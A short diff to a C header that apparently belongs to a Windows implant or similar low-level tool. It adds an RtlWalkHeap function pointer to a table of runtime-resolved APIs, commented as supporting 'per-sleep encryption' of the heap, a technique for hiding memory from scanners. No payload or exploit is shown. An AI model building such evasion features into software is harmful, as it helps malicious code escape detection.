@@ -176,6 +176,8 @@ typedef struct
         WIN_FUNC( RtlAllocateHeap )
         WIN_FUNC( RtlReAllocateHeap )
         WIN_FUNC( RtlFreeHeap )
+        /* ARC-04: heap walk for per-sleep encryption */
+        NTSTATUS ( NTAPI *RtlWalkHeap )( PVOID HeapHandle, PRTL_HEAP_WALK_ENTRY Entry );
         WIN_FUNC( RtlRandomEx )
         WIN_FUNC( RtlNtStatusToDosError )
         WIN_FUNC( RtlGetVersion )
